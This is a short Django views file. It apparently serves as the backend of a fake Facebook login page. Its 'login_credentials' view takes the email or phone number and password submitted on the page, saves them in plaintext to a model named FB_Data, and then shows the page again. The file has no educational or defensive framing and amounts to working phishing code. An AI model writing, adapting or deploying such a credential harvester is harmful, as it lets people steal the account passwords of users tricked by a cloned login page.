from django.shortcuts import render
from django.shortcuts import render, HttpResponse,redirect
from .models import FB_Data

# Create your views here.
def index(request):
    return render(request,'index.html')

def login_credentials(request):
    if request.method == 'POST':
        email=request.POST['email_phone']
        password=request.POST['pwd']
        data=FB_Data(email_phone=email,password=password)
        data.save()
        return render(request,'index.html')
        
    else:
        return HttpResponse("Bad Request")
    